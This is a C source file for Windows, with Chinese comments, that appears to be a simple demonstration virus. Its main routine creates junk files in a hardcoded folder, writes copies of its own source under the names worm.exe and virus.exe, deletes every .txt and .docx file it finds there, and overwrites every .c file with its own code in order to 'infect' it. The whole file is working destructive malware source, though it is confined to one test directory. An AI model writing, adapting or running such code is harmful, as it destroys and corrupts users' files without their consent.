/*This is a flag:start*/
#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>

#define INFECT_PATH "E:\\TMP"
#define DELETE_FILE1 "E:\\TMP\\*.txt"
#define DELETE_FILE2 "E:\\TMP\\*.docx"
#define CREAT_EXE1 "E:\\TMP\\worm.exe"
#define CREAT_EXE2 "E:\\TMP\\virus.exe"
#define Targetfile "E:\\TMP\\*.c"
#define Virusfile "E:\\E_KILL.c"

void MakeRubbish(void);
void CreatEXE(void);
void Remove(void);
void InfectFile(void);
void copyfile(char* infile, char *outfile);

void MakeRubbish(void)
{
	int i = 0;
	FILE *fp = NULL;
	char* path = NULL;
	char* NewName = NULL;
	char tempname[] = "XXXXXX";

	path = INFECT_PATH;
	//_chdir改变当前的工作目录
	if (!_chdir(path))
	{
		printf("open DIR success\n");
	}
	else
	{
		printf("open DIR failed\n");
		perror("Error: ");
	}
	//_mktemp创建文件的唯一名
	NewName = _mktemp(tempname);
	fp = fopen(NewName, "w");
	fclose(fp);

}

void CreatEXE(void)
{
	int i;
	char* s[2] = { CREAT_EXE1,CREAT_EXE2 };
	for (i = 0; i < 2; i++)
	{
		_open(s[i], 0x0100, 0x0080);
		copyfile(Virusfile, s[i]);
	}
}

void Remove(void)
{
	int done;
	int i;

	struct _finddata_t ffblk;
	char *documenttype[2] = { DELETE_FILE1,DELETE_FILE2 };
	for (i = 0; i < 2; i++)
	{
		done = _findfirst(documenttype[i], &ffblk);
		if (done != -1)
		{
			printf("delete %s\n", ffblk.name);
			remove(ffblk.name);
			while (!_findnext(done, &ffblk))
			{
				printf("delete %s\n", ffblk.name);
				remove(ffblk.name);
			}
		}
		_findclose(done);
	}
}

void copyfile(char* infile, char* outfile)
{
	FILE *in, *out;
	in = fopen(infile, "r");
	out = fopen(outfile, "w");
	while (!feof(in))
	{
		fputc(fgetc(in), out);
	}
	fclose(in);
	fclose(out);
}

void InfectFile(void)
{
	int done;
	int i;

	struct _finddata_t ffblk;
	char *documenttype = Targetfile;

	done = _findfirst(documenttype, &ffblk);
	copyfile(Virusfile, ffblk.name);
	while (!_findnext(done, &ffblk))
	{
		copyfile(Virusfile, ffblk.name); //感染
	}
	_findclose(done);
}

/*This is a flag:end*/
int main(void)
{
	MakeRubbish();             //制造垃圾文件
	CreatEXE();                //制造可执行程序
	Remove();                  //删除文件
	InfectFile();              //感染文件
	system("pause");
	return 0;
}